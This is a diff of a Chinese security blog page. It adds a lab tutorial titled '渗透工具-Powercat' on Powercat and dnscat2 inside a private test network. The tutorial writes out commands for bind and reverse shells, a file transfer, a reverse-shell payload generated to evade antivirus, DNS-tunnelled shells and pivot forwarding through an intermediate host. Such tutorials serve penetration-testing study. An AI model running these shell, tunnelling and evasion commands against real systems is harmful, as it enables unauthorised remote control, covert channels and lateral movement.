@@ -80,7 +80,7 @@
 
 
 
-  <meta name="keywords" content="Hexo, NexT" />
+  <meta name="keywords" content="工具,内网,NC,Powercat," />
 
 
 
@@ -93,12 +93,38 @@
 
 
 
-<meta property="og:type" content="website">
-<meta property="og:title" content="TT">
-<meta property="og:url" content="https:&#x2F;&#x2F;blog.pwntools.xyz&#x2F;tags&#x2F;%E5%AE%89%E5%85%A8&#x2F;index.html">
+<meta name="description" content="Powercat就是一个Windows版本的NC,短小精悍，没有什么好介绍的，直接进入主题。 环境准备 Powercat: https:&#x2F;&#x2F;github.com&#x2F;besimorhino&#x2F;powercat.git 只需克隆仓库即可   git clone https:&#x2F;&#x2F;github.com&#x2F;besimorhino&#x2F;powercat.git  Dnscat2: https:&#x2F;&#x2F;github.com&#x2F;">
+<meta name="keywords" content="工具,内网,NC,Powercat">
+<meta property="og:type" content="article">
+<meta property="og:title" content="渗透工具-Powercat">
+<meta property="og:url" content="https:&#x2F;&#x2F;blog.pwntools.xyz&#x2F;post&#x2F;8a9b707a.html">
 <meta property="og:site_name" content="TT">
+<meta property="og:description" content="Powercat就是一个Windows版本的NC,短小精悍，没有什么好介绍的，直接进入主题。 环境准备 Powercat: https:&#x2F;&#x2F;github.com&#x2F;besimorhino&#x2F;powercat.git 只需克隆仓库即可   git clone https:&#x2F;&#x2F;github.com&#x2F;besimorhino&#x2F;powercat.git  Dnscat2: https:&#x2F;&#x2F;github.com&#x2F;">
 <meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http:&#x2F;&#x2F;blog-pwntools.oss-cn-beijing.aliyuncs.com&#x2F;powercat&#x2F;Snipaste_2020-01-27_21-08-20.png!blog_">
+<meta property="og:image" content="http:&#x2F;&#x2F;blog-pwntools.oss-cn-beijing.aliyuncs.com&#x2F;powercat&#x2F;image-20200127210943464.png!blog_">
+<meta property="og:image" content="http:&#x2F;&#x2F;blog-pwntools.oss-cn-beijing.aliyuncs.com&#x2F;powercat&#x2F;image-20200127211727220.png!blog_">
+<meta property="og:image" content="http:&#x2F;&#x2F;blog-pwntools.oss-cn-beijing.aliyuncs.com&#x2F;powercat&#x2F;image-20200127211714942.png!blog_">
+<meta property="og:image" content="http:&#x2F;&#x2F;blog-pwntools.oss-cn-beijing.aliyuncs.com&#x2F;powercat&#x2F;image-20200127212930895.png!blog_">
+<meta property="og:image" content="http:&#x2F;&#x2F;blog-pwntools.oss-cn-beijing.aliyuncs.com&#x2F;powercat&#x2F;image-20200127212952422.png!blog_">
+<meta property="og:image" content="http:&#x2F;&#x2F;blog-pwntools.oss-cn-beijing.aliyuncs.com&#x2F;powercat&#x2F;image-20200127214621586.png!blog_">
+<meta property="og:image" content="http:&#x2F;&#x2F;blog-pwntools.oss-cn-beijing.aliyuncs.com&#x2F;powercat&#x2F;image-20200127214529070.png!blog_">
+<meta property="og:image" content="http:&#x2F;&#x2F;blog-pwntools.oss-cn-beijing.aliyuncs.com&#x2F;powercat&#x2F;image-20200127215423275.png!blog_">
+<meta property="og:image" content="http:&#x2F;&#x2F;blog-pwntools.oss-cn-beijing.aliyuncs.com&#x2F;powercat&#x2F;image-20200127215441029.png!blog_">
+<meta property="og:image" content="http:&#x2F;&#x2F;blog-pwntools.oss-cn-beijing.aliyuncs.com&#x2F;powercat&#x2F;image-20200127215707833.png!blog_">
+<meta property="og:image" content="http:&#x2F;&#x2F;blog-pwntools.oss-cn-beijing.aliyuncs.com&#x2F;powercat&#x2F;image-20200127223435973.png!blog_">
+<meta property="og:image" content="http:&#x2F;&#x2F;blog-pwntools.oss-cn-beijing.aliyuncs.com&#x2F;powercat&#x2F;image-20200127224332083.png!blog_">
+<meta property="og:image" content="http:&#x2F;&#x2F;blog-pwntools.oss-cn-beijing.aliyuncs.com&#x2F;powercat&#x2F;image-20200127224412875.png!blog_">
+<meta property="og:image" content="http:&#x2F;&#x2F;blog-pwntools.oss-cn-beijing.aliyuncs.com&#x2F;powercat&#x2F;image-20200127221511390.png!blog_">
+<meta property="og:image" content="http:&#x2F;&#x2F;blog-pwntools.oss-cn-beijing.aliyuncs.com&#x2F;powercat&#x2F;image-20200127221533084.png!blog_">
+<meta property="og:image" content="http:&#x2F;&#x2F;blog-pwntools.oss-cn-beijing.aliyuncs.com&#x2F;powercat&#x2F;image-20200127221553535.png!blog_">
+<meta property="og:image" content="http:&#x2F;&#x2F;blog-pwntools.oss-cn-beijing.aliyuncs.com&#x2F;powercat&#x2F;image-20200128120603648.png!blog_">
+<meta property="og:image" content="http:&#x2F;&#x2F;blog-pwntools.oss-cn-beijing.aliyuncs.com&#x2F;powercat&#x2F;image-20200128120626785.png!blog_">
+<meta property="og:image" content="http:&#x2F;&#x2F;blog-pwntools.oss-cn-beijing.aliyuncs.com&#x2F;powercat&#x2F;image-20200128120657649.png!blog_">
+<meta property="og:image" content="http:&#x2F;&#x2F;blog-pwntools.oss-cn-beijing.aliyuncs.com&#x2F;powercat&#x2F;image-20200128120725957.png!blog_">
+<meta property="og:updated_time" content="2020-01-28T04:53:13.958Z">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http:&#x2F;&#x2F;blog-pwntools.oss-cn-beijing.aliyuncs.com&#x2F;powercat&#x2F;Snipaste_2020-01-27_21-08-20.png!blog_">
 
 
 
@@ -128,13 +154,13 @@
 
 
 
-  <link rel="canonical" href="https://blog.pwntools.xyz/tags/安全/"/>
+  <link rel="canonical" href="https://blog.pwntools.xyz/post/8a9b707a.html"/>
 
 
 
 
 
-  <title>标签: 安全 | TT</title>
+  <title>渗透工具-Powercat | TT</title>
   
 
 
@@ -172,7 +198,7 @@
     
   
 
-  <div class="container sidebar-position-left ">
+  <div class="container sidebar-position-left page-post-detail">
     <div class="headband"></div>
 
     <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
@@ -310,82 +336,370 @@
           <div id="content" class="content">
             
 
-  
-  
-  
-  <div class="post-block tag">
+  <div id="posts" class="posts-expand">
+    
 
-    <div id="posts" class="posts-collapse">
-      <div class="collection-title">
-        <h1>安全<small>标签</small>
-        </h1>
-      </div>
+  
 
-      
-        
+  
+  
+  
 
   <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://blog.pwntools.xyz/post/8a9b707a.html">
 
-      <h2 class="post-title">
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="TT">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="https://avatars3.githubusercontent.com/u/20963266?s=460&v=4">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="TT">
+    </span>
+
+    
+      <header class="post-header">
+
         
-            <a class="post-title-link" href="/post/25086.html" itemprop="url">
-              
-                <span itemprop="name">GDB调试命令--持续更新</span>
-              
-            </a>
         
-      </h2>
+          <h1 class="post-title" itemprop="name headline">渗透工具-Powercat</h1>
+        
 
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated"
-              datetime="2019-10-20T20:50:20+08:00"
-              content="2019-10-20" >
-          10-20
-        </time>
-      </div>
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-01-28T12:48:50+08:00">
+                2020-01-28
+              </time>
+            
 
-    </header>
-  </article>
+            
 
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%B7%A5%E5%85%B7/" itemprop="url" rel="index">
+                    <span itemprop="name">工具</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/post/8a9b707a.html#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count"
+                        data-disqus-identifier="post/8a9b707a.html" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+             <span id="/post/8a9b707a.html" class="leancloud_visitors" data-flag-title="渗透工具-Powercat">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数&#58;</span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
 
       
-        
+      
 
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/post/36656.html" itemprop="url">
-              
-                <span itemprop="name">IoT测试环境搭建</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated"
-              datetime="2019-10-18T22:36:56+08:00"
-              content="2019-10-18" >
-          10-18
-        </time>
-      </div>
-
-    </header>
-  </article>
-
+      
+        <p><code>Powercat</code>就是一个Windows版本的<code>NC</code>,短小精悍，没有什么好介绍的，直接进入主题。</p>
+<h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h3><ol>
+<li><p>Powercat: <a href="https://github.com/besimorhino/powercat.git" target="_blank" rel="noopener">https://github.com/besimorhino/powercat.git</a></p>
+<p>只需克隆仓库即可</p>
+</li>
+</ol>
+<pre><code class="shell">git clone https://github.com/besimorhino/powercat.git</code></pre>
+<ol start="2">
+<li><p>Dnscat2: <a href="https://github.com/iagox86/dnscat2.git" target="_blank" rel="noopener">https://github.com/iagox86/dnscat2.git</a></p>
+<p>需要安装有<code>ruby</code>环境</p>
+</li>
+</ol>
+<pre><code class="shell">git clone https://github.com/iagox86/dnscat2.git
+cd dnscat2/server/
+gem install bundler
+bundle install</code></pre>
+<a id="more"></a>
+<h3 id="测试环境介绍"><a href="#测试环境介绍" class="headerlink" title="测试环境介绍"></a>测试环境介绍</h3><table>
+<thead>
+<tr>
+<th align="center">操作系统</th>
+<th align="center">IP地址</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">Windows Server 2008</td>
+<td align="center">192.168.130.100</td>
+</tr>
+<tr>
+<td align="center">Windows 7</td>
+<td align="center">192.168.130.150<br />192.168.227.161</td>
+</tr>
+<tr>
+<td align="center">Ubuntu 18.04</td>
+<td align="center">192.168.227.129</td>
+</tr>
+</tbody></table>
+<ul>
+<li>Windows 7 可访问另外两台机器</li>
+<li>ubuntu和server 2008网络不可达</li>
+</ul>
+<h3 id="具体场景及操作"><a href="#具体场景及操作" class="headerlink" title="具体场景及操作"></a>具体场景及操作</h3><h4 id="场景一-Ubuntu正向连接windows-7"><a href="#场景一-Ubuntu正向连接windows-7" class="headerlink" title="场景一: Ubuntu正向连接windows 7"></a>场景一: Ubuntu正向连接windows 7</h4><p>Windows 7 下执行（注意执行权限的绕过）:</p>
+<blockquote>
+<p>Powercat -l  -p 8080 -e cmd.exe -v</p>
+</blockquote>
+<p>Ubuntu 下执行:</p>
+<blockquote>
+<p>nc 192.168.227.161 8080 -vv</p>
+</blockquote>
+<p>结果如下:</p>
+<p>Windows7:</p>
+<p><img src="http://blog-pwntools.oss-cn-beijing.aliyuncs.com/powercat/Snipaste_2020-01-27_21-08-20.png!blog_" alt="Windows7 Powercat的执行"></p>
+<p>Ubuntu:</p>
+<p><img src="http://blog-pwntools.oss-cn-beijing.aliyuncs.com/powercat/image-20200127210943464.png!blog_" alt="Ubuntu nc执行结果"></p>
+<h4 id="场景二-Ubuntu反向链接Windows7"><a href="#场景二-Ubuntu反向链接Windows7" class="headerlink" title="场景二: Ubuntu反向链接Windows7"></a>场景二: Ubuntu反向链接Windows7</h4><p>Ubuntu下执行:</p>
+<blockquote>
+<p>nc -l -p 8080 -vv</p>
+</blockquote>
+<p>Window 7 下执行:</p>
+<blockquote>
+<p>powercat -c 192.168.227.129 -p 8888 -v -e cmd.exe</p>
+</blockquote>
+<p>结果如下:</p>
+<p>Windows7:</p>
+<p><img src="http://blog-pwntools.oss-cn-beijing.aliyuncs.com/powercat/image-20200127211727220.png!blog_" alt="image-20200127211727220"></p>
+<p>ubuntu:</p>
+<p><img src="http://blog-pwntools.oss-cn-beijing.aliyuncs.com/powercat/image-20200127211714942.png!blog_" alt="image-20200127211714942"></p>
+<h4 id="场景三-Windows-7反向连接Windows-server-2008并返回-Powershell"><a href="#场景三-Windows-7反向连接Windows-server-2008并返回-Powershell" class="headerlink" title="场景三: Windows 7反向连接Windows server 2008并返回 Powershell"></a>场景三: Windows 7反向连接Windows server 2008并返回 Powershell</h4><p>此场景需要两台Windows的机器:</p>
+<p>Windows 7 下执行:</p>
+<blockquote>
+<p>powecat -l -p 8080 -v</p>
+</blockquote>
+<p>Window server 2008 下执行:</p>
+<blockquote>
+<p>powercat -c 192.168.130.150 -p 8080 -v -ep</p>
+</blockquote>
+<p>返回结果如下:</p>
+<p>Windows server 2008：</p>
+<p><img src="http://blog-pwntools.oss-cn-beijing.aliyuncs.com/powercat/image-20200127212930895.png!blog_" alt="image-20200127212930895"></p>
+<p>Windows 7:</p>
+<p><img src="http://blog-pwntools.oss-cn-beijing.aliyuncs.com/powercat/image-20200127212952422.png!blog_" alt="image-20200127212952422"></p>
+<h4 id="场景四：Powercat文件传输"><a href="#场景四：Powercat文件传输" class="headerlink" title="场景四：Powercat文件传输"></a>场景四：Powercat文件传输</h4><p>Windows Server 2008的C盘根目录下有个flag.txt。使用Powercat来传输这个文件。</p>
+<p>在Windows 7下执行:</p>
+<blockquote>
+<p>powercat -l -p 8080 -of  c:\Users\ctfwin7\Desktop\flag.txt -v</p>
+</blockquote>
+<p>Windows Server 2008 下执行:</p>
+<blockquote>
+<p>Powercat -c 192.168.130.150 -p 8080 -i c:\flag.txt -v</p>
+</blockquote>
+<p>返回结果如下:</p>
+<p>Windows Server 2008</p>
+<p><img src="http://blog-pwntools.oss-cn-beijing.aliyuncs.com/powercat/image-20200127214621586.png!blog_" alt="image-20200127214621586"></p>
+<p>Window 7</p>
+<p><img src="http://blog-pwntools.oss-cn-beijing.aliyuncs.com/powercat/image-20200127214529070.png!blog_" alt="image-20200127214529070"></p>
+<p>这里需要注意的是，Window Server 2008传输完成后并不会终端连接，我在后面特地加了一行回车，跟321这几个字符串，一并写入到了windows 7接受的flag.txt文件。如果不想增加内容，使用ctrl+c中断即可。</p>
+<h4 id="场景五-powercat生成Payload-躲避杀软"><a href="#场景五-powercat生成Payload-躲避杀软" class="headerlink" title="场景五: powercat生成Payload(躲避杀软)"></a>场景五: powercat生成Payload(躲避杀软)</h4><p>Powercat生成payload也是有正反向的区分的。</p>
+<p>WIndows 7:</p>
+<blockquote>
+<p>powercat -l -p 8080 -e cmd -v -g &gt;&gt; shell.ps1</p>
+</blockquote>
+<p>将生成的shell.ps1拿到Windows server 2008下</p>
+<p>Windows Server 2008</p>
+<blockquote>
+<p>./shell.ps1</p>
+</blockquote>
+<p>返回结果如下:</p>
+<p>Window7:</p>
+<p><img src="http://blog-pwntools.oss-cn-beijing.aliyuncs.com/powercat/image-20200127215423275.png!blog_" alt="image-20200127215423275"></p>
+<p>windows Server 2008:</p>
+<p><img src="http://blog-pwntools.oss-cn-beijing.aliyuncs.com/powercat/image-20200127215441029.png!blog_" alt="image-20200127215441029"></p>
+<p>PS: 也可以使用-ge 生成编码后的脚本，然后直接使用Powershell -E shellcode执行。</p>
+<p><img src="http://blog-pwntools.oss-cn-beijing.aliyuncs.com/powercat/image-20200127215707833.png!blog_" alt="image-20200127215707833"></p>
+<h4 id="场景六-Powercat-DNS协议"><a href="#场景六-Powercat-DNS协议" class="headerlink" title="场景六: Powercat - DNS协议"></a>场景六: Powercat - DNS协议</h4><p>Kali(Ubuntu下没法用dnscat，ubuntu自带一个53端口的程序，两个机器的IP是一样的)下执行:</p>
+<blockquote>
+<p>ruby dns2.rb ms08067.test -e open –no-cache</p>
+</blockquote>
+<p><img src="http://blog-pwntools.oss-cn-beijing.aliyuncs.com/powercat/image-20200127223435973.png!blog_" alt="image-20200127223435973"></p>
+<p>Windows 7 下执行:</p>
+<blockquote>
+<p>powercat -c 192.168.227.129 -p 53 -dns ms08067.test -e cmd.exe</p>
+</blockquote>
+<p>结果如下:</p>
+<p>Kali接收到的shell (执行命令很卡)：</p>
+<p><img src="http://blog-pwntools.oss-cn-beijing.aliyuncs.com/powercat/image-20200127224332083.png!blog_" alt="image-20200127224332083"></p>
+<p>Windows 7：</p>
+<p><img src="http://blog-pwntools.oss-cn-beijing.aliyuncs.com/powercat/image-20200127224412875.png!blog_" alt="image-20200127224412875"></p>
+<h4 id="场景七-Powercat-转发"><a href="#场景七-Powercat-转发" class="headerlink" title="场景七: Powercat 转发:"></a>场景七: Powercat 转发:</h4><p>在我们设计的场景中Windows server 2008 和 ubuntu是无法直接通信的，但是使用windows 7作为跳板就可以达到这样的目的:</p>
+<p>Windows 2008 Server下执行:</p>
+<blockquote>
+<p>Powercat -l -v -p 9999 -e cmd.exe</p>
+</blockquote>
+<p>WIndows 7 下执行:</p>
+<blockquote>
+<p>Powercat -l -v -p 8000 -r tcp:192.168.130.100:9999</p>
+</blockquote>
+<p>Ubuntu 下执行:</p>
+<blockquote>
+<p> nc 192.168.227.161 8000 -vv</p>
+</blockquote>
+<p>结果图如下:</p>
+<p>Windows Server 2008 :</p>
+<p><img src="http://blog-pwntools.oss-cn-beijing.aliyuncs.com/powercat/image-20200127221511390.png!blog_" alt="image-20200127221511390"></p>
+<p>Windows 7:</p>
+<p><img src="http://blog-pwntools.oss-cn-beijing.aliyuncs.com/powercat/image-20200127221533084.png!blog_" alt="image-20200127221533084"></p>
+<p>Ubuntu :</p>
+<p><img src="http://blog-pwntools.oss-cn-beijing.aliyuncs.com/powercat/image-20200127221553535.png!blog_" alt="image-20200127221553535"></p>
+<h5 id="场景七-二-Powercat转发-DNS协议"><a href="#场景七-二-Powercat转发-DNS协议" class="headerlink" title="场景七-二 Powercat转发-DNS协议"></a>场景七-二 Powercat转发-DNS协议</h5><p>跟上面的场景一样，唯一不同的是本次走的是DNS协议</p>
+<p>Kali跟之前一样，运行dnscat即可:</p>
+<blockquote>
+<p>ruby dns2.rb ms08067.test -e open –no-cache</p>
+</blockquote>
+<p>Windows 7:</p>
+<blockquote>
+<p>powercat -l -p 9999 -r dns:192.168.227.129::ms08067.test</p>
+</blockquote>
+<p>Windows Server 2008下执行:</p>
+<blockquote>
+<p>powercat -c 192.168.130.150 -p 9999 -e cmd.exe -v</p>
+</blockquote>
+<p>结果如下:</p>
+<p>Windows7:</p>
+<p><img src="http://blog-pwntools.oss-cn-beijing.aliyuncs.com/powercat/image-20200128120603648.png!blog_" alt="image-20200128120603648"></p>
+<p>windows Server 2008:</p>
+<p><img src="http://blog-pwntools.oss-cn-beijing.aliyuncs.com/powercat/image-20200128120626785.png!blog_" alt="image-20200128120626785"></p>
+<p>Kali(ubuntu):</p>
+<p><img src="http://blog-pwntools.oss-cn-beijing.aliyuncs.com/powercat/image-20200128120657649.png!blog_" alt="image-20200128120657649"></p>
+<p><img src="http://blog-pwntools.oss-cn-beijing.aliyuncs.com/powercat/image-20200128120725957.png!blog_" alt="image-20200128120725957"></p>
 
       
     </div>
+    
+    
+    
 
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/%E5%B7%A5%E5%85%B7/" rel="tag"># 工具</a>
+          
+            <a href="/tags/%E5%86%85%E7%BD%91/" rel="tag"># 内网</a>
+          
+            <a href="/tags/NC/" rel="tag"># NC</a>
+          
+            <a href="/tags/Powercat/" rel="tag"># Powercat</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/post/7dc2b2.html" rel="next" title="固件解压分析工具及方法整理">
+                <i class="fa fa-chevron-left"></i> 固件解压分析工具及方法整理
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
   </div>
   
   
   
+  </article>
 
-  
+
+
+    <div class="post-spread">
+      
+        <!-- Go to www.addthis.com/dashboard to customize your tools -->
+<div class="addthis_inline_share_toolbox">
+  <script type = "text/javascript" src = "//s7.addthis.com/js/300/addthis_widget.js#pubid=ra-5dad56b440a98d03" async = "async" ></script>
+</div>
+
+      
+    </div>
+  </div>
 
 
           </div>
@@ -393,6 +707,20 @@
 
 
           
+
+  
+    <div class="comments" id="comments">
+      <div id="disqus_thread">
+        <noscript>
+          Please enable JavaScript to view the
+          <a href="https://disqus.com/?ref_noscript" target="_blank" rel="noopener">comments powered by Disqus.</a>
+        </noscript>
+      </div>
+    </div>
+
+  
+
+
 
         </div>
         
@@ -413,8 +741,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
 
-      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <section class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
@@ -513,6 +850,22 @@
         </div>
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#环境准备"><span class="nav-number">1.</span> <span class="nav-text">环境准备</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#测试环境介绍"><span class="nav-number">2.</span> <span class="nav-text">测试环境介绍</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#具体场景及操作"><span class="nav-number">3.</span> <span class="nav-text">具体场景及操作</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#场景一-Ubuntu正向连接windows-7"><span class="nav-number">3.1.</span> <span class="nav-text">场景一: Ubuntu正向连接windows 7</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#场景二-Ubuntu反向链接Windows7"><span class="nav-number">3.2.</span> <span class="nav-text">场景二: Ubuntu反向链接Windows7</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#场景三-Windows-7反向连接Windows-server-2008并返回-Powershell"><span class="nav-number">3.3.</span> <span class="nav-text">场景三: Windows 7反向连接Windows server 2008并返回 Powershell</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#场景四：Powercat文件传输"><span class="nav-number">3.4.</span> <span class="nav-text">场景四：Powercat文件传输</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#场景五-powercat生成Payload-躲避杀软"><span class="nav-number">3.5.</span> <span class="nav-text">场景五: powercat生成Payload(躲避杀软)</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#场景六-Powercat-DNS协议"><span class="nav-number">3.6.</span> <span class="nav-text">场景六: Powercat - DNS协议</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#场景七-Powercat-转发"><span class="nav-number">3.7.</span> <span class="nav-text">场景七: Powercat 转发:</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#场景七-二-Powercat转发-DNS协议"><span class="nav-number">3.7.1.</span> <span class="nav-text">场景七-二 Powercat转发-DNS协议</span></a></li></ol></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
       
@@ -662,6 +1015,10 @@
 
 
   
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
 
   
 
@@ -679,6 +1036,18 @@
       <script id="dsq-count-scr" src="https://blog-rvy0h9n8wm.disqus.com/count.js" async></script>
     
 
+    
+      <script type="text/javascript">
+        var disqus_config = function () {
+          this.page.url = 'https://blog.pwntools.xyz/post/8a9b707a.html';
+          this.page.identifier = 'post/8a9b707a.html';
+          this.page.title = '渗透工具-Powercat';
+        };
+        var d = document, s = d.createElement('script');
+        s.src = 'https://blog-rvy0h9n8wm.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', '' + +new Date());
+        (d.head || d.body).appendChild(s);
+      </script>
     
 
   
